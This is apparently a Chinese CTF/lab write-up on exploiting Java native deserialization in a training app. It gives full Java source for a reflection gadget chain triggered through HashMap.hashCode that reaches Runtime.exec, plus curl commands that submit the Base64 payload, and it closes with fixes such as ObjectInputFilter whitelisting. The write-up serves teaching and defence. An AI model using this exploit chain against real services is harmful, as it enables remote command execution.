---
title: "Java 反序列化靶场实录：从可控反射到链式调用"
slug: "java-deserialization-lab"
date: 2026-10-25T10:22:32+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "从一个双容器 Java 靶场出发，拆解 readObject、可控反射、HashMap 触发点与 serialVersionUID 兼容性，并给出一套可复现的最小 PoC。"
summary: "从双容器 Java 靶场出发，拆解 readObject、可控反射、HashMap 触发点与 serialVersionUID 兼容性。"
tags: ["Java", "反序列化", "HashMap", "靶场"]
categories: ["Web 安全"]
series: ["Web 安全笔记"]
weight: 9
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/java-deserialization-lab/workflow.svg" alt="Base64 进入 ObjectInputStream，HashMap 触发 hashCode，最终经反射执行命令。" loading="lazy">
  <figcaption>图 1 · Java 反序列化利用链。Base64 进入 ObjectInputStream，HashMap 触发 hashCode，最终经反射执行命令。</figcaption>
</figure>

> 本文记录的是授权靶场中的学习过程。目标地址、端口和凭据均已脱敏，代码只用于理解漏洞成因与修复方式。

这是一道很典型的 Java 反序列化题：入口只有一个 `ObjectInputStream.readObject()`，但真正有趣的地方在于，目标代码把「对象、方法名、参数类型、参数值」全都交给了序列化数据控制。

最终利用链可以压缩成四步：

1. 服务端反序列化用户提交的 Base64。
2. `HashMap.readObject()` 为了重建哈希表，对 key 调用 `hashCode()`。
3. 恶意 `Dog.hashCode()` 进入 `wagTail()`，触发可控反射。
4. 三段反射依次完成 `getMethod → invoke → exec`，最终执行命令。

下面按「入口 → gadget → 链设计 → 触发条件 → 兼容性 → PoC → 防御」拆开。

## 1. 靶场模型

题目使用两个容器：

| 角色 | 作用 | 访问方式 |
| --- | --- | --- |
| `dog-app` | 存在反序列化漏洞的目标服务 | `http://127.0.0.1:<target-port>` |
| `rev-shell` | 攻击机、监听端和跳板机 | 由靶场单独分配 |

两个容器共享网络命名空间，因此彼此访问都走 `127.0.0.1`。端口只是靶场实例参数，不应写进公开笔记。

整体流程如下：

```text
访问 dog-app
  → 找到导入/导出接口
  → 反编译 jar，定位 readObject
  → 构造 gadget chain
  → 生成 Base64 payload
  → 在 rev-shell 监听
  → 向 dog-app 提交 payload
  → 获得命令执行结果
```

## 2. 先把 jar 变成可调试工程

CTF Java 题通常给一个 jar。只靠 JD-GUI 看代码可以找到漏洞点，但要构造序列化对象、复用目标类字段、验证 `serialVersionUID`，更稳的方式是把反编译源码恢复成一个可编译工程。

### 2.1 先看 jar 是不是 Spring Boot fat jar

jar 本质上是 zip。先按压缩包打开，观察目录：

```text
demo.jar/
├─ BOOT-INF/
│  ├─ classes/        # 题目自己的 class
│  └─ lib/            # 依赖 jar
├─ META-INF/
│  └─ maven/
│     └─ org.example/demo3/pom.xml
└─ org/springframework/boot/loader/
```

如果看到 `BOOT-INF/classes/com`，通常说明业务代码在这里；`BOOT-INF/lib` 是题目打包进去的依赖；`META-INF/maven/<groupId>/<artifactId>/pom.xml` 往往保留了原始 Maven 坐标和依赖列表。

这一步很重要，因为后面不是「随便新建一个 Java 文件」就能复现目标类。包名、类名、字段和依赖版本都必须尽量贴近题目。

### 2.2 用 JD-GUI 导出源码

用 JD-GUI 打开 jar，选择 `File → Save All Sources`，把源码导出成压缩包。导出大 jar 时可能需要等一会儿。

如果反编译结果里带了很多行号或自动生成的注释，可以在 JD-GUI 的 `Help → Preferences` 里关闭对应选项，重新导出，阅读会干净很多。

### 2.3 在 IDEA 中恢复 Maven 工程

推荐步骤：

1. 在 IDEA 新建 Maven 项目；
2. 把反编译包里的 `BOOT-INF/classes/com` 复制到 `src/main/java/com`；
3. 找到 `META-INF/maven/.../pom.xml`，用它的内容替换项目自己的 `pom.xml`；
4. 在右侧 Maven 面板点击同步，让 IDEA 下载依赖；
5. 使用 `Build Project` 检查缺失的包、类和依赖。

项目结构应该类似：

```text
demo-lab/
├─ pom.xml
├─ lib/                         # 可选：题目自带但仓库拉不到的依赖
└─ src/main/java/
   └─ com/example/demo/...
```

反编译源码出现爆红时，先区分两类问题：

- **包路径错误**：反编译器把内部类、import 或 package 写错；
- **依赖缺失**：目标 jar 依赖的库没有进入 Maven。

前者按原 jar 的包结构修正；后者可以从 `BOOT-INF/lib` 里复制依赖到项目 `lib/`，再在 IDEA 的 `Project Structure → Libraries` 中把它加入项目库。这里只求能编译和调试，不必追求反编译源码的排版完美。

### 2.4 用测试类确认类真的能用

不要一上来就写 EXP。先建一个测试类，尝试实例化目标类、调用 getter/setter 或序列化一次：

```java
public class SmokeTest {
    public static void main(String[] args) throws Exception {
        Class<?> dogClass = Class.forName("com.example.demo.Dog.Dog");
        System.out.println(dogClass.getName());
        for (var field : dogClass.getDeclaredFields()) {
            System.out.println(field.getType().getSimpleName()
                    + " " + field.getName());
        }
    }
}
```

能编译、能加载类并看到字段，再进入反序列化链分析。这样可以把「环境没搭好」和「漏洞链写错了」分开。

这一节的流程参考了 [在 IDEA 使用 CTF 中 Java 题的 jar 包](https://yschen20.github.io/2025/12/14/%E5%9C%A8IDEA%E4%BD%BF%E7%94%A8CTF%E4%B8%ADJava%E9%A2%98%E7%9A%84jar%E5%8C%85/)；具体目录和依赖仍要以题目 jar 为准。

## 3. 入口：用户输入直接进入 readObject

页面源码里能看到导入和导出狗的接口：

| 方法 | 路径 | 行为 |
| --- | --- | --- |
| `POST` | `/dogs/import?data=<base64>` | 导入 Base64 序列化数据 |
| `GET` | `/dogs/export` | 导出当前对象为 Base64 |
| `GET` | `/dogs` | 查看狗列表 |
| `POST` | `/dogs/{id}/feed` | 喂狗 |

`import` 和 `export` 同时出现，通常意味着应用没有使用 JSON，而是在直接处理 Java 原生序列化。反编译后可以确认漏洞点：

```java
public void importDogsBase64(String base64Data) throws Exception {
    byte[] raw = Base64.getDecoder().decode(base64Data);
    try (ObjectInputStream ois = new ObjectInputStream(
            new ByteArrayInputStream(raw))) {
        Collection<Dog> imported = (Collection<Dog>) ois.readObject();
        for (Dog dog : imported) {
            dog.setId(nextId++);
            dogs.put(dog.getId(), dog);
        }
    }
}
```

问题不在强转，而在强转之前：

```java
Collection<Dog> imported = (Collection<Dog>) ois.readObject();
```

`readObject()` 会恢复攻击者提交的任意可序列化对象。即使最后因为 `ClassCastException` 返回 500，对象恢复过程中的副作用也已经执行完成。

## 4. Gadget：把反射参数写进对象字段

反编译 `Dog` 和 `DogModel` 后，可以看到两个关键方法。

### 4.1 可控反射方法

```java
default Object wagTail(
        Object object,
        String methodName,
        Class<?>[] paramTypes,
        Object[] args) {
    if (object == null) return null;
    try {
        Method method = object.getClass().getMethod(methodName, paramTypes);
        return method.invoke(object, args);
    } catch (Exception ignored) {
        return null;
    }
}
```

对象、方法名、参数类型和参数值全部来自 `Dog` 的字段，因此这里等价于一个由攻击者控制的反射调用器。

### 4.2 hashCode 成为触发入口

```java
@Override
public int hashCode() {
    wagTail(object, methodName, paramTypes, args);
    return Objects.hash(id);
}
```

只要我们能找到一个「在反序列化期间自动调用 key.hashCode()」的容器，就能让这条反射链在 `readObject()` 内部启动。

### 4.3 链式调度器

`DogService` 还提供了一个多步调用器：

```java
public Object chainWagTail() {
    Object input = null;
    for (Dog dog : dogs.values()) {
        if (input == null) input = dog.object;
        input = dog.wagTail(
                input,
                dog.methodName,
                dog.paramTypes,
                dog.args);
    }
    return input;
}
```

前一个 `wagTail()` 的返回值会成为下一个的 `input`，所以可以把多个小反射调用串成一条完整利用链。

## 5. 三段式反射链

目标不是直接调用 `Runtime.exec()`，而是通过反射逐步拿到 `Runtime` 实例，再执行命令。

| 步骤 | 输入对象 | 调用的方法 | 返回结果 |
| --- | --- | --- | --- |
| 1 | `Runtime.class` | `getMethod("getRuntime", Class[])` | `Method getRuntime` |
| 2 | `Method getRuntime` | `Method.invoke(null, Object[])` | `Runtime` 实例 |
| 3 | `Runtime` 实例 | `exec(String[])` | 命令执行 |

对应字段配置：

```java
Dog step1 = setDog(
    Runtime.class,
    "getMethod",
    new Class<?>[]{String.class, Class[].class},
    new Object[]{"getRuntime", new Class<?>[0]}
);

Dog step2 = setDog(
    Runtime.class, // 链式调用时会被前一步返回值覆盖
    "invoke",
    new Class<?>[]{Object.class, Object[].class},
    new Object[]{null, new Object[0]}
);

Dog step3 = setDog(
    null, // 链式调用时会被 Runtime 实例覆盖
    "exec",
    new Class<?>[]{String[].class},
    new Object[]{new String[]{"sh", "-c", "id"}}
);
```

实际执行时，`chainWagTail()` 的数据流是：

```text
Runtime.class
  → getMethod("getRuntime")
  → Method(getRuntime)
  → Method.invoke(null)
  → Runtime 实例
  → Runtime.exec(new String[]{"sh", "-c", "id"})
```

## 6. HashMap 触发机制

服务端最终想把结果转换成 `Collection<Dog>`，直接提交一个 `ArrayList<Dog>` 不会自动调用 `Dog.hashCode()`。

但 `HashMap` 在反序列化时需要重建哈希表：

```java
static final int hash(Object key) {
    return key == null ? 0 : (key.hashCode()) ^ (key.hashCode() >>> 16);
}
```

因此可以把入口 `Dog` 作为 `HashMap` 的 key。目标执行：

```text
ObjectInputStream.readObject()
  → HashMap.readObject()
  → 读取 key(Dog)
  → hash(key)
  → Dog.hashCode()
  → wagTail(...)
  → chainWagTail()
  → Runtime.exec(...)
  → 最后 (Collection) 强转失败，接口返回 500
```

命令在 `HashMap.readObject()` 内部就已经执行，后面的类型转换异常只会影响 HTTP 状态码，不会回滚副作用。

### 本地构造时的坑

如果直接对已填充字段的入口 `Dog` 执行 `map.put(dog, "trigger")`，本地生成 payload 时就会调用一次 `hashCode()`，可能在本机提前执行命令。

更稳妥的做法是先放入一个字段为空的临时对象，等 `put()` 完成后再通过反射填入真正的链字段：

```java
HashMap<Object, Object> payloadMap = new HashMap<>();
Dog entry = setDog(null, "chainWagTail", new Class<?>[0], new Object[0]);
payloadMap.put(entry, "trigger");

// 此时 HashMap 已经记录了入口对象，修改字段不会再触发一次 hashCode。
setField(entry, "object", service);
setField(entry, "methodName", "chainWagTail");
setField(entry, "paramTypes", new Class<?>[0]);
setField(entry, "args", new Object[0]);
```

## 7. serialVersionUID 兼容性

本地编译环境与目标 JDK 不一致时，最常见的错误是：

```text
java.io.InvalidClassException:
local class incompatible: stream classdesc serialVersionUID = ...
```

Java 原生序列化除了比较类名，还会比较 `serialVersionUID`。如果目标没有显式声明，JDK 会根据字段、方法和修饰符自动计算；本地重新写一个同名类，通常不会得到相同的值。

处理步骤：

1. 在目标环境或等价的 jar 上执行 `serialver`。
2. 把得到的 UID 显式写进本地兼容类。
3. 保持接口继承关系和关键字段一致。

```bash
serialver -classpath . com.example.demo.Dog.Dog
serialver -classpath . com.example.demo.Dog.DogService
```

示例：

```java
private static final long serialVersionUID = -598652723587541526L;
```

文章中的 UID 只是示例，实际测试必须替换为目标 `serialver` 的输出。`DogModel` 在目标端是否继承 `Serializable`，本地也要保持一致。

## 8. 最小 PoC

下面的代码用于说明数据流，不是可直接打任意目标的通用 EXP。实际靶场需要替换 UID，并确认目标类名、字段名、Map 实现与迭代顺序。

### 8.1 DogModel.java

```java
package com.example.demo.Dog;

import java.lang.reflect.Method;

public interface DogModel {
    default Object wagTail(
            Object object,
            String methodName,
            Class<?>[] paramTypes,
            Object[] args) {
        if (object == null) return null;
        try {
            Method method = object.getClass().getMethod(methodName, paramTypes);
            return method.invoke(object, args);
        } catch (Exception ignored) {
            return null;
        }
    }
}
```

### 8.2 Dog.java

```java
package com.example.demo.Dog;

import java.io.Serializable;
import java.util.Objects;

public class Dog implements Serializable, DogModel {
    private static final long serialVersionUID = -598652723587541526L;

    private int id;
    private String name;
    private String breed;
    private int age;

    Object object;
    String methodName;
    Class<?>[] paramTypes;
    Object[] args;

    public Dog(int id, String name, String breed, int age) {
        this.id = id;
        this.name = name;
        this.breed = breed;
        this.age = age;
    }

    public int getId() {
        return id;
    }

    public void setId(int id) {
        this.id = id;
    }

    @Override
    public int hashCode() {
        wagTail(object, methodName, paramTypes, args);
        return Objects.hash(id);
    }
}
```

### 8.3 DogService.java

```java
package com.example.demo.Dog;

import java.io.Serializable;
import java.util.LinkedHashMap;
import java.util.Map;

public class DogService implements Serializable {
    private static final long serialVersionUID = 988523103989629987L;

    private Map<Integer, Dog> dogs = new LinkedHashMap<>();

    public Object chainWagTail() {
        Object input = null;
        for (Dog dog : dogs.values()) {
            if (input == null) input = dog.object;
            input = dog.wagTail(
                    input,
                    dog.methodName,
                    dog.paramTypes,
                    dog.args);
        }
        return input;
    }
}
```

### 8.4 Exploit.java

```java
import com.example.demo.Dog.Dog;
import com.example.demo.Dog.DogService;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class Exploit {
    private static void setField(Object target, String name, Object value)
            throws Exception {
        Field field = target.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(target, value);
    }

    private static Dog setDog(
            Object object,
            String methodName,
            Class<?>[] paramTypes,
            Object[] args) throws Exception {
        Dog dog = new Dog(2, "demo", "demo", 2);
        setField(dog, "object", object);
        setField(dog, "methodName", methodName);
        setField(dog, "paramTypes", paramTypes);
        setField(dog, "args", args);
        return dog;
    }

    private static String serialize(Object value) throws Exception {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(output)) {
            oos.writeObject(value);
        }
        return Base64.getEncoder().encodeToString(output.toByteArray());
    }

    public static void main(String[] args) throws Exception {
        Dog step1 = setDog(
                Runtime.class,
                "getMethod",
                new Class<?>[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class<?>[0]});

        Dog step2 = setDog(
                Runtime.class,
                "invoke",
                new Class<?>[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]});

        Dog step3 = setDog(
                null,
                "exec",
                new Class<?>[]{String[].class},
                new Object[]{new String[]{"sh", "-c", "id"}});

        DogService service = new DogService();
        Field dogsField = DogService.class.getDeclaredField("dogs");
        dogsField.setAccessible(true);
        @SuppressWarnings("unchecked")
        Map<Integer, Dog> dogs = (Map<Integer, Dog>) dogsField.get(service);
        dogs.put(1, step1);
        dogs.put(2, step2);
        dogs.put(3, step3);

        HashMap<Object, Object> payloadMap = new HashMap<>();
        Dog entry = setDog(
                null,
                "chainWagTail",
                new Class<?>[0],
                new Object[0]);
        payloadMap.put(entry, "trigger");

        setField(entry, "object", service);
        setField(entry, "methodName", "chainWagTail");
        setField(entry, "paramTypes", new Class<?>[0]);
        setField(entry, "args", new Object[0]);

        System.out.print(serialize(payloadMap));
    }
}
```

## 9. 本地验证方法

先把四个类放到与包名一致的目录：

```bash
mkdir -p com/example/demo/Dog
javac com/example/demo/Dog/*.java
javac -cp . Exploit.java
```

生成 Base64：

```bash
PAYLOAD="$(java -cp . Exploit)"
```

在授权靶场中提交：

```bash
ENCODED="$(python3 -c \
  'import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1], safe=""))' \
  "$PAYLOAD")"
curl -s -X POST \
  "http://127.0.0.1:<target-port>/dogs/import?data=${ENCODED}"
```

如果命令是 `id`，可以用可观测的副作用验证，例如让命令写入靶场自己的临时目录，或向授权监听端发送固定标记。不要把成功与否只寄托在 HTTP 200 上，因为最终的 `ClassCastException` 很可能会让接口返回 500。

验证时至少确认三件事：

- 服务端确实收到了 `HashMap` 类型的数据。
- `serialVersionUID` 没有触发 `InvalidClassException`。
- 命令执行的证据来自目标环境，而不是本地生成 payload 时误触发。

## 10. 修复建议

这道题的价值不只是「打通」，更在于看清几个常见设计错误。

### 10.1 禁止对不可信输入使用 Java 原生反序列化

优先使用 JSON、Protobuf 等数据格式，并对字段做严格校验。Java 原生序列化不应出现在公网接口中。

### 10.2 使用 ObjectInputFilter 白名单

如果业务或历史协议确实无法迁移，至少要为 `ObjectInputStream` 设置类白名单和深度、引用、数组长度限制：

```java
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.example.demo.dto.*;java.util.LinkedHashMap;" +
    "java.util.Map$Entry;java.lang.String;java.lang.Integer;!*");
ois.setObjectInputFilter(filter);
```

实际规则应基于业务 DTO 收敛，不能只照抄示例。示例刻意没有放行
`Class`、`Method`、`Runtime` 等反射和运行时类型，因此会拒绝这类 gadget。

### 10.3 去掉不必要的反射能力

业务对象不应该持有一个由外部输入控制的 `Method`、参数类型和参数数组。即使暂时保留反射，也要把可调用方法限制为固定枚举，而不是从对象字段动态读取。

### 10.4 最小权限与隔离

应用容器以低权限用户运行，限制出网和文件系统写入；把反序列化服务放在独立的信任边界内。这样即使出现新的 gadget，也能降低影响面。

### 10.5 监控异常模式

大量 `InvalidClassException`、`ClassCastException`、异常长的 Base64 请求，以及反序列化接口后的 500，都值得进入日志告警。

## 11. 复盘

这次踩坑主要集中在三个地方：

1. **只看强转，忽略 readObject**：真正的危险动作发生在类型转换之前。
2. **把反编译变量名当成源码**：`var30` 之类的变量只适合定位逻辑，不应该直接复制进文章。
3. **只在本地 `map.put()` 验证**：入口对象可能在本地提前触发 hashCode，导致 payload 看起来「没发出去却执行了」。

我现在更愿意把这类题拆成四个问题：

- 入口是什么？
- 危险动作发生在哪个回调？
- 谁会在反序列化时自动调用这个回调？
- 执行结果如何被观察和保护？

把这四个问题答清楚，比堆一串不可读的 EXP 更有价值。

## 参考资料

- Java Serialization Specification
- `java.io.ObjectInputFilter`
- OWASP Deserialization Cheat Sheet
- 靶场提供的 `dog-app` jar 与公开题面
- [在 IDEA 使用 CTF 中 Java 题的 jar 包](https://yschen20.github.io/2025/12/14/%E5%9C%A8IDEA%E4%BD%BF%E7%94%A8CTF%E4%B8%ADJava%E9%A2%98%E7%9A%84jar%E5%8C%85/)
